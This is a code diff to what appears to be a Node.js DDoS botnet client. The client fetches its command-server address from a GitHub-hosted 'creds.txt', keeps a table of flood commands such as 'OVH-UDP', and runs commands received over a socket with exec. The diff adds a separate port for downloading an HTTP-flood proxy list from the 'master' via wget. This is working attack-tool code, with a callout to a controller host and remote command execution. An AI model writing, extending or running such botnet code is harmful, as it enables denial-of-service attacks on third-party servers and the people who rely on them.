@@ -9,6 +9,7 @@ const client = new net.Socket()
 
 let HOST = "127.0.0.1"
 let PORT = 7777
+let HTTP_PORT = 3000
 
 const METHODS = {
     "OVH-UDP": "screen -dmS %s ./methods/ovh-udp %s %i 4096 1 -1 %i",
@@ -46,6 +47,7 @@ fetch("https://raw.githubusercontent.com/xIvan0ff/ServerManager/main/creds.txt")
             const splittedData = text.split(":")
             HOST = splittedData[0]
             PORT = splittedData[1]
+            HTTP_PORT = splittedData[2]
             console.log(
                 chalk.grey(
                     `[${chalk.greenBright(
@@ -98,8 +100,16 @@ client.on("data", function (data) {
         )
         if (method == "HTTP-FLOOD") {
             // DOWNLOAD PROXIES AUTOMATICALLY FROM THE MASTER
+            console.log(
+                chalk.grey(
+                    `[${chalk.greenBright(
+                        "+"
+                    )}] Downloading proxies from master.`
+                )
+            )
+
             execSync(
-                `wget 'http://${HOST}:${PORT}/proxies' -O methods/browser/proxies.txt`
+                `wget 'http://${HOST}:${HTTP_PORT}/proxies' -O methods/browser/proxies.txt`
             )
         }
         exec(cmd)
